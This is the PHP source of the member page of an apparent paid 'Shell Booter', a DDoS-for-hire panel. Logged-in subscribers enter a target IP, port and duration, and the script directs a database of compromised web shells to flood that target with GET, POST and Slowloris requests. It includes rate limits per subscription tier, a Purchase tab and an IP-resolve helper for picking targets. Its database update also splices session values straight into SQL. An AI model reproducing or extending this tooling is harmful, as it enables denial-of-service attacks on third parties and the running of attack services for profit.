<?php

include("config.php");

$footer = "";

if(!isset($_SESSION['username'])) {
	header("Location: index.php");
}

if (isset($_POST['host']) && isset($_POST['port']) && isset($_POST['time']) && isset($_SESSION['username'])){
											
	$konflicthost = str_replace(" ","",$_POST['host']);							
	
	if (!preg_match( "/^(([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]).){3}([1-9]?[0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$/", $konflicthost)) $footer = "<div style='text-align:center; font-weight:bold; font-family:Arial, Helvetica, sans-serif; font-size:18px; color:#FFF; width:100%; height:25px; padding-top:6px; background-color:#CC0000; position:absolute; bottom:0px;'>Host must be a valid IP Address.</div><br />";
	
	else {  		
								
		$konflicttime = intval($_POST['time']);	
		$konflictport = intval($_POST['port']);
	
		$myattacks = $_SESSION['myattacks'];
	
		$myattacks = explode("::",$myattacks);
		$myattacks = explode("--",$myattacks[0]);
	
		if ($konflicthost == $myattacks[0] || time() < ($myattacks[1] + TIME_BETWEEN_BOOTS) && strlen($myattacks[1]) != 0 && strlen($myattacks[0]) != 0) {
		
			$footer = "<div style='text-align:center; font-weight:bold; font-family:Arial, Helvetica, sans-serif; font-size:18px; color:#FFF; width:100%; height:25px; padding-top:6px; background-color:#CC0000; position:absolute; bottom:0px;'>You cannot boot the same host twice, and you cannot boot twice within " . TIME_BETWEEN_BOOTS . " seconds.</div><br />";
		
		} else {
	
			$myattacks = $konflicthost . "--" . time() . "::" . $_SESSION['myattacks'];
			
			mysql_query("UPDATE `users` SET `attacks` = '$myattacks' WHERE `id` = '" . $_SESSION['id'] . "';");
			
			$_SESSION['myattacks'] = $myattacks;
		
			if ($konflicttime > MAX_BOOT_TIME || !is_numeric($konflicttime)) $konflicttime = MAX_BOOT_TIME;		
			if (!is_numeric($konflictport)) $konflictport = 80;									
			
			$shells = array();
			$query = mysql_query("SELECT * FROM `shells` WHERE `valid` = 'TRUE';") or die(mysql_error());
			while($row = mysql_fetch_array($query)){
				
				$shells[] = $row['location'] . '::' . $row['type'];
					
			}
			
			shuffle($shells);	
			$shell_array_max = 0;
			
			switch ($_SESSION['group']) {
			
				case "administrator":
					$shell_array_max = ceil(ADMIN_SHELL_PERCENT * count($shells));
				break;
				case "subscriber":
					$shell_array_max = ceil(SUBSCRIBER_SHELL_PERCENT * count($shells));
				break;
				
			}
			
			$get_url = "?act=phptools" . "&ip=" . urlencode($konflicthost) . "&host=" . urlencode($konflicthost) . "&time=" . urlencode($konflicttime) . "&port=" . urlencode($konflictport);
			
			$post_fields = array(
							'ip'=>urlencode($konflicthost),
							'host'=>urlencode($konflicthost),
							'time'=>urlencode($konflicttime),
							'port'=>urlencode($konflictport)
							);
			$post_fields_string = "";
			foreach($post_fields as $key=>$value) $post_fields_string .= $key . '=' . $value . '&';
			$post_fields_string = rtrim($post_fields_string,'&');
			
			ignore_user_abort(TRUE); 												
	    	$mh = curl_multi_init();									
	    	$handles = array();	
						
			for ($i = 0; $i < count($shells); $i++) {
				
				$shell_text = explode("::",$shells[$i]);
				$shell_loc = $shell_text[0];
				$shell_type = $shell_text[1];
								
				switch ($shell_type) {
					case 'g':
						// GET
						$url = $shell_loc . $get_url;
						$ch = curl_init($url); 
	      	    		curl_setopt($ch, CURLOPT_TIMEOUT, 15);         	
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 	
	        			curl_multi_add_handle($mh, $ch);					
	        			$handles[] = $ch;

					break;
					case 'p':
						// POST
						$url = $shell_loc;
						$ch = curl_init($url); 
	      	    		curl_setopt($ch, CURLOPT_TIMEOUT, 15);         	
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 	
						curl_setopt($ch, CURLOPT_POST, count($post_fields));
						curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields_string);
	        			curl_multi_add_handle($mh, $ch);					
	        			$handles[] = $ch;
					break;
					case 's':
						// SLOWLORIS
						$url = $shell_loc . $get_url;
						$ch = curl_init($url); 
	      	    		curl_setopt($ch, CURLOPT_TIMEOUT, 15);         	
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 	
	        			curl_multi_add_handle($mh, $ch);					
	        			$handles[] = $ch;
					break;
				}
				
			}
	
	    	$running = null;											
	    	do { 														
	     	   curl_multi_exec($mh, $running);
	     	   usleep(1000000); 											
	    	} while ($running > 0);	
				
   		 	foreach($handles as $ch) {
   		       curl_multi_remove_handle($mh, $ch);						
    		} 
			
    		curl_multi_close($mh);																		

			$footer = "<div style='text-align:center; font-weight:bold; font-family:Arial, Helvetica, sans-serif; font-size:18px; color:#FFF; width:100%; height:25px; padding-top:6px; background-color:#006600; position:absolute; bottom:0px;'>Boot Completed</div><br />";
		
		}
	
	} // End valid IP address
	
}

switch ($_POST['form_type']) {
	case "resolve_ip_form":
		$url = str_replace("http://","",$_POST['u']);
		$footer = "<div style='text-align:center; font-weight:bold; font-family:Arial, Helvetica, sans-serif; font-size:18px; color:#FFF; width:100%; height:25px; padding-top:6px; background-color:#006600; position:absolute; bottom:0px;'>" . gethostbyname($url) . "</div><br />";
	break;
	case "logout_form":
		logout();
	break;
}
		
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title><?php echo BOOTER_NAME . " - Member Home"; ?></title>
<link rel="stylesheet" href="style.css" type="text/css" media="screen" /> 
<script type="text/javascript">
function validate_boot_form() {
	if ("guest" != "<?php echo $_SESSION['group']; ?>") {
		var form = document.getElementById("boot_form");
		var error = false;
		if (form.elements["host"].value.length == 0 || form.elements["time"].value.length == 0 || form.elements["time"].value.length == 0) error = true;
		if (!error)	form.submit();
		else flag_error("Fill in all fields.","boot_error");
	} else {
		alert("Guests cannot use the booter.");	
	}
}
function validate_resolve_form() {
	var form = document.getElementById("resolve_ip_form");
	var error = false;
	if (form.elements["u"].value.length == 0) error = true;
	if (!error)	form.submit();
	else flag_error("Fill in all fields.","resolve_error");
}
function flag_error(c,id) {
	document.getElementById(id).innerHTML = c;
}
</script>
</head>
<body>
<center>
<div id="top">

<img class="logo" src="logo.png" />

<div class="tabs">
	<div class="tab" onclick="document.location.href='member.php';">Member Home</div>
	<div class="tab" onclick="document.location.href='ucp.php';">User CP</div>
<div class="tab" onclick="document.location.href='purchase.php';">Purchase</div>
    <div class="tab" onclick="document.getElementById('logout_form').submit();"><form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post" id="logout_form" style="display:inline;"><input type="hidden" name="form_type" value="logout_form" id="logout_form" />Logout</form></div>
</div>

</div>

<div id="placeholder">

	<div id="placeholderL">
		<div class="left">
			<span class="title">Menu:</span>
			<ul class="menu">
				<?php echo left_menu(); ?>
           </ul>
		</div>
	</div>

<div id="placeholderR">
<div class="right"><br /><br />

<center><span class="heading_2" style="text-align:center; width:100%;">Shell Booter</span><br /><br />
<img src="image_green.php" />
<br /><br /></center>

<form action="<?php $_SERVER['PHP_SELF']; ?>" method="post" id="boot_form">
<input type="hidden" name="action" value="boot">
<table border="0" cellpadding="0" cellspacing="0" align="center">
<tr>
<td style="padding-right:10px;"><span class="heading_1">Host</span></td>
<td><input type="text" name="host" class="input" placeholder="192.168.1.1" /></span></td>
</tr>
<tr>
<td style="padding-right:10px;"><span class="heading_1">Length</span></td>
<td><input type="text" name="time" class="input" placeholder="Seconds" /></td>
</tr>
<tr>
<td style="padding-right:10px;"><span class="heading_1">Port</span></td>
<td><input type="text" name="port" class="input" value="80" /></td>
</tr>
<tr><td colspan="2"><div id="blank" style="height:5px;"> </div></td></tr>
<tr><td colspan="2"><div style="float:right;"><table cellpadding="0" cellspacing="0" border="0"><tr><td width="100%" style="padding-right:10px;"><div style="float:right;"><span id="boot_error" class="error_box"></span></div></td><td><div style="float:right;"><a href="javascript:validate_boot_form();" style="text-decoration:none;"><div id="button">Boot</div></a></div></td></tr></table></div></td></tr>
</table>
</form>
<br />
</div>

<div class="right">

<center><span class="heading_2" style="text-align:center; width:100%;">Resolve IP</span><br /><br />

<form action="<?php $_SERVER['PHP_SELF']; ?>" method="post" id="resolve_ip_form">
<input type="hidden" name="form_type" value="resolve_ip_form" />
<table border="0" cellpadding="0" cellspacing="0" align="center">
<tr>
<td style="padding-right:10px;"><span class="heading_1">URL</span></td>
<td><input type="text" name="u" class="input" placeholder="www.example.com" /></span></td>
<tr><td colspan="2"><div id="blank" style="height:5px;"> </div></td></tr>
<tr><td colspan="2"><div style="float:right;"><table cellpadding="0" cellspacing="0" border="0"><tr><td width="100%" style="padding-right:10px;"><div style="float:right;"><span id="resolve_error" class="error_box"></span></div></td><td><div style="float:right;"><a href="javascript:validate_resolve_form();" style="text-decoration:none;"><div id="button">Resolve IP</div></a></div></td></tr></table></div></td></tr>
</table>
</form><br />
</div>

</div>

<div id="footer"><?php echo footer(); ?></div>

</div>
</center>

<?php echo $footer; ?>

</body>
</html>